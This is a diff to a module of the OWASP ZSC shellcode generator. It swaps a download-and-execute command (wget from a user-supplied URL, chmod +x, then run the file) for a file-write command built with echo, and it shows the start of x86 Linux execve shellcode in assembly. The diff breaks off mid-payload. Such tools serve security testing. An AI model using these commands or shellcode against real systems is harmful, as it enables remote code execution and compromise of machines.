@@ -1,4 +1,5 @@
-"""
+
+'''
 OWASP ZSC
 https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
 https://github.com/zscproject/OWASP-ZSC
@@ -6,18 +7,19 @@ http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
 
 shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
-"""
+'''
+import binascii
 from new_cores import base_module
 from cores import stack
 from lib.opcoder.linux_x86 import convert
 
 
 class Module(base_module.BaseModule):
-    url = base_module.OptString("", "File URL")
-    file_dest = base_module.OptString("", "File Target")
+    file_dest = base_module.OptString("", "File Destination")
+    data = base_module.OptString("", "File data")
 
     def generate(self):
-        command = f"wget {self.url} -O {self.file_dest}; chmod +x {self.file_dest}; {self.file_dest}"
+        command = f"echo -e \"{self.data}\" > {self.file_dest}"
         payload = "push   $0xb\n"
         payload += "pop    %%eax\n"
         payload += "cltd\n"
